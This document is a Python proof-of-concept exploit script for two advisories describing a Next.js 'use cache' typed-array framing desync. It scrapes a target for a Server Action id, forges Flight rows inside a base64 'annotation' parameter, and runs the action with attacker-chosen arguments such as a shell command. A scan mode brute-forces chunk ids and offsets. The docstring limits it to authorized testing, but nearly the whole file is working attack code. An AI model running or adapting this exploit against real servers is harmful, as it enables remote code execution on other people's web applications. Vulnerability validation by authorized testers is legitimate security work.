#!/usr/bin/env python3
"""
GHSA-xqc2-xf4c-x3h3 / GHSA-673q-mjm6-r5xr
Next.js `use cache` typed-array framing desync -> Server Action RCE.

The PoC targets an application that:
  - runs Next.js 16.0.0 - 16.4.0 with `cacheComponents: true`
  - has a `use cache` function returning several typed arrays that share one
    ArrayBuffer, plus a caller-influenced value
  - references a Server Action from the cached page

The PoC:
  1. discovers the Server Action id from the page or its client chunks
  2. builds a base64 `annotation` blob whose forged Flight rows land at the
     decoder's resume offset after the dropped second typed-array view
  3. requests the page with that blob
  4. reads the action output from the rendered <pre> summary

Authorized testing only.  Use against systems you own or have explicit written
permission to test.
"""

import argparse
import base64
import html
import http.client
import json
import re
import ssl
import sys
import urllib.parse

GHSA = "GHSA-xqc2-xf4c-x3h3"
NEXT_GHSA = "GHSA-673q-mjm6-r5xr"


def http_get(url, timeout, insecure):
    parts = urllib.parse.urlsplit(url)
    host = parts.hostname
    port = parts.port
    if port is None:
        port = 443 if parts.scheme == "https" else 80

    if parts.scheme == "https":
        context = ssl.create_default_context()
        if insecure:
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
        conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=context)
    else:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)

    target = parts.path or "/"
    if parts.query:
        target += "?" + parts.query
    try:
        conn.request(
            "GET",
            target,
            headers={"User-Agent": "rsc-cache-check/" + GHSA, "Connection": "close"},
        )
        resp = conn.getresponse()
        body = resp.read()
        return resp.status, dict((k.lower(), v) for k, v in resp.getheaders()), body
    finally:
        conn.close()


def discover_action_id(base, path, timeout, insecure):
    status, _, body = http_get(base + path, timeout, insecure)
    text = body.decode("utf-8", "replace")

    direct = re.search(r"\$ACTION_ID_([0-9a-fA-F]{40,})", text)
    if direct:
        return direct.group(1).lower()

    for src in re.findall(r"<script[^>]+src=[\"']([^\"']+)[\"']", text):
        js_url = urllib.parse.urljoin(base + path, src)
        try:
            _, _, js_body = http_get(js_url, timeout, insecure)
            js = js_body.decode("utf-8", "replace")
        except Exception:
            continue
        ref = re.search(
            r"createServerReference[^\n]{0,200}?[\"']([0-9a-fA-F]{40,})[\"']", js
        )
        if ref:
            return ref.group(1).lower()
    return None


def build_blob(forged_rows, cid="4", overread=8192):
    """Place forged Flight rows at the decoder's post-desync resume offset."""
    forged = forged_rows.encode("latin-1")

    # Fixed point: the length-declared header length depends on the blob length,
    # which determines where the forged rows start.
    length = overread + len(forged)
    resume_at = overread
    for _ in range(8):
        header = "%s:o%x," % (cid, length)
        resume_at = overread - len(header)
        length = resume_at + len(forged)

    blob = bytearray(b"F" * length)
    blob[resume_at : resume_at + len(forged)] = forged
    return bytes(blob), resume_at, length


def extract_summary(page):
    match = re.search(r"<pre[^>]*>(.*?)</pre>", page, re.S)
    if not match:
        return None
    raw = re.sub(r"<!--.*?-->", "", match.group(1), flags=re.S).strip()
    try:
        return json.loads(html.unescape(raw))
    except Exception:
        return None


def parse_int_list(spec):
    values = []
    for part in spec.split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part:
            start, end = part.split("-", 1)
            values.extend(range(int(start), int(end) + 1))
        else:
            values.append(int(part))
    return values


def make_forged_rows(action_id, chunk_id, action_args):
    return (
        "6:%s\n" % json.dumps(action_args, separators=(",", ":"))
        + '5:{"id":"%s","bound":"$@6"}\n' % action_id
        + '%s:{"then":"$h5"}\n' % chunk_id
    )


def looks_like_execution(annotation):
    if not isinstance(annotation, str):
        return False
    if annotation in ("", "undefined", "null"):
        return False
    if re.fullmatch(r"Uint8Array\(\d+\)", annotation):
        return False
    if annotation.startswith("[unresolved:"):
        return False
    return True


def print_action(annotation):
    print("[+] Server Action executed with attacker-chosen arguments")
    print("================ action output ================")
    print(annotation.rstrip("\n"))
    print("==============================================")


def attempt(base, path, action_id, action_args, chunk_id, overread, timeout, insecure):
    rows = make_forged_rows(action_id, chunk_id, action_args)
    blob, resume_at, length = build_blob(rows, chunk_id, overread)
    encoded = urllib.parse.quote(base64.b64encode(blob).decode(), safe="")
    separator = "&" if "?" in path else "?"
    url = base + path + separator + "annotation=" + encoded
    status, _, body = http_get(url, timeout, insecure)
    page = body.decode("utf-8", "replace")
    summary = extract_summary(page)
    annotation = summary.get("annotation") if isinstance(summary, dict) else None
    return status, annotation, page, length, resume_at


def main():
    parser = argparse.ArgumentParser(
        description="Validate %s / %s (Next.js use cache typed-array RCE)"
        % (GHSA, NEXT_GHSA)
    )
    parser.add_argument("url", help="Target base URL, e.g. http://127.0.0.1:3100")
    parser.add_argument(
        "--path",
        default="/",
        help="Page path whose cached lookup accepts ?annotation= (default: /)",
    )
    parser.add_argument(
        "--cmd",
        default="id",
        help="Argument passed to the target Server Action (default: id)",
    )
    parser.add_argument(
        "--args-json",
        default=None,
        help="JSON array of action arguments; overrides --cmd",
    )
    parser.add_argument(
        "--action-id",
        default=None,
        help="Explicit Server Action id (40-64 hex); skips discovery",
    )
    parser.add_argument(
        "--chunk-id",
        default="4",
        help="Flight chunk id of the caller-influenced value (default: 4; lab layout)",
    )
    parser.add_argument(
        "--overread",
        type=int,
        default=8192,
        help="Bytes consumed after the dropped typed-array view (default: 8192; lab layout)",
    )
    parser.add_argument(
        "--scan",
        action="store_true",
        help="Try common chunk ids and overread sizes",
    )
    parser.add_argument(
        "--chunk-ids",
        default="1-8",
        help="Chunk ids for --scan (default: 1-8)",
    )
    parser.add_argument(
        "--overreads",
        default="1024,2048,4096,8192,16384,32768",
        help="Overread sizes for --scan",
    )
    parser.add_argument(
        "--timeout", type=float, default=30.0, help="Network timeout in seconds"
    )
    parser.add_argument(
        "--insecure", action="store_true", help="Do not verify TLS certificates"
    )
    args = parser.parse_args()

    parts = urllib.parse.urlsplit(args.url)
    if not parts.scheme or not parts.hostname:
        parser.error("URL must include scheme and host")
    base = "%s://%s" % (parts.scheme, parts.netloc)
    path = args.path or parts.path or "/"
    if not path.startswith("/"):
        path = "/" + path

    action_args = [args.cmd]
    if args.args_json:
        try:
            action_args = json.loads(args.args_json)
        except json.JSONDecodeError as exc:
            parser.error("--args-json is not valid JSON: %s" % exc)
        if not isinstance(action_args, list):
            parser.error("--args-json must be a JSON array")

    action_id = args.action_id or discover_action_id(
        base, path, args.timeout, args.insecure
    )
    if not action_id:
        print("[-] could not discover a Server Action id; pass --action-id")
        return 2
    print("[*] action id: %s" % action_id)

    if args.scan:
        chunk_ids = parse_int_list(args.chunk_ids)
        overreads = parse_int_list(args.overreads)
        print(
            "[*] scanning %d chunk ids x %d overread sizes"
            % (len(chunk_ids), len(overreads))
        )
        last = None
        for chunk_id in chunk_ids:
            for overread in overreads:
                try:
                    status, annotation, page, length, resume_at = attempt(
                        base,
                        path,
                        action_id,
                        action_args,
                        str(chunk_id),
                        overread,
                        args.timeout,
                        args.insecure,
                    )
                except Exception as exc:
                    print(
                        "[*] chunk=%s overread=%s request failed: %s"
                        % (chunk_id, overread, exc)
                    )
                    continue
                last = (status, annotation, page)
                if looks_like_execution(annotation):
                    print(
                        "[+] chunk=%s overread=%s -> HTTP %d, action executed"
                        % (chunk_id, overread, status)
                    )
                    print_action(annotation)
                    return 0
                print(
                    "[*] chunk=%s overread=%s -> HTTP %d, no output"
                    % (chunk_id, overread, status)
                )

        if last:
            status, annotation, page = last
            if isinstance(annotation, str):
                print("[-] blob stayed opaque (%s); target appears patched" % annotation)
            else:
                print("[-] scan found no action output (last HTTP %d)" % status)
        else:
            print("[-] scan found no action output")
        return 2

    try:
        status, annotation, page, length, resume_at = attempt(
            base,
            path,
            action_id,
            action_args,
            args.chunk_id,
            args.overread,
            args.timeout,
            args.insecure,
        )
    except Exception as exc:
        print("[-] request failed: %s" % exc)
        return 2

    print(
        "[*] blob: %d bytes, forged rows at offset %d, args=%r"
        % (length, resume_at, action_args)
    )
    print("[*] HTTP %d" % status)

    if looks_like_execution(annotation):
        print_action(annotation)
        return 0

    if isinstance(annotation, (dict, list)):
        print("[+] attacker bytes parsed as Flight rows, but no action output")
        print(json.dumps(annotation))
        return 1

    if isinstance(annotation, str):
        print("[-] blob stayed opaque (%s); target appears patched" % annotation)
    else:
        print("[-] no summary found; not confirmed")
        snippet = page[:300].replace("\n", " ")
        if snippet:
            print("    body: %s" % snippet)
    return 2


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
